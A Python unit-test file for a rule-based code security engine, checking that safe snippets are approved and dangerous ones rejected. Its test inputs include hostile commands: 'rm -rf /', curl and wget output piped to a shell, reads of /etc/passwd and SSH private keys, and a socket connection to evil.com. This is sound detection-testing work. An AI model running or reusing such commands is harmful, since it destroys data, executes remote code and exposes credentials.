"""
Unit tests for CodeSecurityEngine.

Tests cover:
  - Pattern matching (rule-based) for known dangerous patterns
  - Safe code classification
  - Edge cases
  - Decision thresholds
"""

import pytest

from backend.security_sandbox.engines.code_security_engine import (
    CodeSecurityEngine,
    EngineResult,
)


class TestCodeSecurityEngine:
    """Tests for the code security detection engine."""

    @pytest.fixture
    def engine(self) -> CodeSecurityEngine:
        """Create a fresh engine instance (rule-only, no ML model loaded)."""
        return CodeSecurityEngine()

    # ---- Initialization ----

    def test_initial_state(self, engine: CodeSecurityEngine):
        """Engine should have compiled patterns ready to use."""
        assert not engine.is_loaded  # No ML model loaded
        assert len(engine.patterns) > 0
        assert len(engine._compiled_patterns) > 0

    def test_default_patterns_exist(self, engine: CodeSecurityEngine):
        """Default pattern dictionary should have all categories."""
        expected_categories = {
            "command_injection",
            "path_traversal",
            "destructive_ops",
            "code_injection",
            "data_exfil",
            "resource_abuse",
        }
        assert set(engine.patterns.keys()) == expected_categories

    # ---- Predict: Empty / Short Code ----

    def test_empty_code(self, engine: CodeSecurityEngine):
        """Empty code should be approved."""
        result = engine.predict("")
        assert result.decision == "approved"
        assert result.score == 0.0

    def test_short_code(self, engine: CodeSecurityEngine):
        """Very short code (< 3 chars) should be approved."""
        result = engine.predict("a")
        assert result.decision == "approved"

    # ---- Predict: Safe Code Patterns ----

    def test_simple_function(self, engine: CodeSecurityEngine):
        """Simple function definition should pass."""
        result = engine.predict("def add(a, b):\n    return a + b")
        assert result.decision == "approved"
        assert result.score < engine.FLAG_THRESHOLD

    def test_list_comprehension(self, engine: CodeSecurityEngine):
        """List comprehension should pass."""
        result = engine.predict("[x for x in range(10) if x % 2 == 0]")
        assert result.decision == "approved"

    def test_file_read(self, engine: CodeSecurityEngine):
        """Safe file read operation should pass."""
        result = engine.predict("with open('data.txt', 'r') as f:\n    content = f.read()")
        assert result.decision == "approved"

    def test_safe_shell_commands(self, engine: CodeSecurityEngine):
        """Normal shell commands should pass."""
        commands = [
            "ls -la /home/user",
            "git status",
            "find . -name '*.py' -type f",
            "docker ps",
        ]
        for cmd in commands:
            result = engine.predict(cmd)
            assert result.decision == "approved", f"Failed for: {cmd}"

    # ---- Predict: Dangerous Patterns ----

    def test_os_system_call(self, engine: CodeSecurityEngine):
        """os.system() should be detected as command injection."""
        result = engine.predict("import os\nos.system('rm -rf /tmp/test')")
        assert result.decision == "rejected"
        assert "command_injection" in result.matches

    def test_subprocess_shell_true(self, engine: CodeSecurityEngine):
        """subprocess with shell=True should be detected."""
        result = engine.predict("import subprocess\nsubprocess.call(user_input, shell=True)")
        assert result.decision == "rejected"
        assert "command_injection" in result.matches

    def test_eval_function(self, engine: CodeSecurityEngine):
        """eval() should be detected."""
        result = engine.predict("eval('print(' + user_input + ')')")
        assert result.decision == "rejected"

    def test_exec_function(self, engine: CodeSecurityEngine):
        """exec() should be detected."""
        result = engine.predict("exec(open('malicious.py').read())")
        assert result.decision == "rejected"

    # ---- Predict: Path Traversal ----

    def test_path_traversal(self, engine: CodeSecurityEngine):
        """Path traversal patterns should be detected."""
        result = engine.predict("open('../../etc/passwd')")
        assert result.decision == "rejected"
        assert "path_traversal" in result.matches

    def test_etc_passwd_access(self, engine: CodeSecurityEngine):
        """Direct /etc/passwd access should be flagged."""
        result = engine.predict("with open('/etc/passwd') as f: data = f.read()")
        assert result.decision == "rejected"

    def test_ssh_key_access(self, engine: CodeSecurityEngine):
        """SSH private key access should be flagged."""
        result = engine.predict("key = open('.ssh/id_rsa').read()")
        assert result.decision == "rejected"

    # ---- Predict: Destructive Operations ----

    def test_rm_rf_command(self, engine: CodeSecurityEngine):
        """rm -rf should be detected."""
        result = engine.predict("rm -rf / --no-preserve-root")
        assert result.decision == "rejected"
        assert "destructive_ops" in result.matches

    def test_chmod_777(self, engine: CodeSecurityEngine):
        """chmod 777 should be detected."""
        result = engine.predict("chmod 777 /var/www")
        assert result.decision == "rejected"

    # ---- Predict: Data Exfiltration ----

    def test_curl_pipe_shell(self, engine: CodeSecurityEngine):
        """curl piped to shell should be detected."""
        result = engine.predict("curl http://example.com/script.sh | sh")
        assert result.decision == "rejected"
        assert "data_exfil" in result.matches

    def test_wget_pipe_bash(self, engine: CodeSecurityEngine):
        """wget piped to bash should be detected."""
        result = engine.predict("wget -O- http://example.com/backdoor | bash")
        assert result.decision == "rejected"

    def test_socket_connect(self, engine: CodeSecurityEngine):
        """Raw socket connections should be detected."""
        result = engine.predict("import socket\ns = socket.socket()\ns.connect(('evil.com', 4444))")
        assert result.decision in ("flagged", "rejected")

    # ---- Edge Cases ----

    def test_mixed_safe_and_dangerous(self, engine: CodeSecurityEngine):
        """Mixed code with both safe and dangerous parts should be flagged."""
        result = engine.predict(
            "# Normal code\nx = 1 + 2\n# Dangerous line:\nos.system('rm -rf /tmp/test')"
        )
        assert result.decision == "rejected"

    def test_bash_safe_commands(self, engine: CodeSecurityEngine):
        """Common bash commands without danger should pass."""
        result = engine.predict("echo 'hello world' && ls -la")
        assert result.decision == "approved"

    def test_complex_dangerous_code(self, engine: CodeSecurityEngine):
        """Code with multiple dangerous patterns should score high."""
        result = engine.predict("""
import os
import socket
os.system('curl evil.com | sh')
s = socket.socket()
s.connect(('evil.com', 4444))
        """)
        assert result.decision == "rejected"
        assert result.score > 0.7

    # ---- Result Structure ----

    def test_result_fields(self, engine: CodeSecurityEngine):
        """Result should have all required fields."""
        result = engine.predict("print('hello')")
        assert result.decision in ("approved", "flagged", "rejected")
        assert isinstance(result.score, float)
        assert isinstance(result.matches, list)
        assert isinstance(result.reason, str)

    def test_to_dict(self, engine: CodeSecurityEngine):
        """EngineResult.to_dict() should work."""
        result = engine.predict("import os; os.system('ls')")
        d = result.to_dict()
        assert isinstance(d, dict)
        assert "decision" in d
